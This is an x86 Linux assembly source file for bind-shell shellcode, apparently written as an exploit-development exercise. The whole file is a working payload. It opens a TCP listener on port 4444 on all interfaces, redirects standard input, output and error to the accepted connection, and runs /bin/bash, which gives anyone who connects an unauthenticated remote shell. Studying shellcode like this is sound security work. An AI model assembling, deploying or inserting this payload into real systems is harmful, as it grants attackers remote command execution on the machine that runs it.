; bind_shell.nasm
; Author: Bo Pearce

global _start

section .text
_start: 
	; setup the socket
	; process to create a server listener connection

	; int sockfd = socket(AF_INET, SOCK_STREAM, 6);

	; address.sin_family = AF_INET; 
	; address.sin_addr.s_addr = INADDR_ANY; 
        ; address.sin_port = htons( PORT )

	; bind(sockfd, (struct sockaddr *)&address, sizeof(address);

	; listen(sockfd, 0);

	; new_sock = accept(sockfd, NULL, NULL);

	; zero out
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	; create socket
	mov al, 102 ;socketcall
	mov bl, 0x1 ;socket
	push 0x6 ;TCP
	push 0x1 ;SOCK_STREAM
	push 0x2 ;AF_INET
	mov ecx, esp ;POINTER AT ECX TO DATA
	int 0x80
	mov esi, eax ;save socket FD
	; end create socket

	; bind(sockfd, (struct sockaddr *)&address, sizeof(address);
	mov al, 102 ;socketcall
	mov bl, 0x2 ;bind
	; build address
	push edx ; INNADR_ANY
	push WORD 0x5c11 ;port 4444 pushed in reverse byte order
	push bx ;AF_INET defined as "short sin_family". a short is 2 bytes. we push bx or it won't work	
	mov ecx, esp
	push 0x10 ;sizeof(address)
	push ecx
	push esi ;sockfd
	mov ecx, esp ;POINTER AT ECX TO DATA
	int 0x80
	; end bind	

	; listen (sockfd, 1);
	mov bl, 0x4 ;listen
	push 0x1 ;backlog
	push esi ;sockfd
	mov ecx, esp ;pointer at ecx to data
	mov al, 102 ;socketcall
	int 0x80 ;kernel int

	; accept(sockfd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
	mov bl, 0x5 ;accept
	push edx ;NULL
	push edx ;NULL
	push esi ;sockfd
	mov ecx, esp ;pointer at ecx to dat
	mov al, 102 ;socketcall
	int 0x80
	mov ebx, eax ;save return value
	
	;at this point we have our connection setup, now we need to redirect std in, out, err to our fd
	;kern int 63 dup2
	; dup2(int oldfd, int newfd)
	mov ecx, edx ;stdin
	mov al, 63 ;dup2
	int 0x80
	
	mov cl, 0x1 ;stdout	
	mov al, 63
	int 0x80

	mov cl, 0x2 ;stderr
	mov al, 63
	int 0x80

	;call kern int 11 execve	
	;int execve(const char *filename, char *const argv[], char *const envp[]);

	; PUSH ////bin/bash (12)
	push edx
        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f
	mov ebx, esp
	push edx
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80

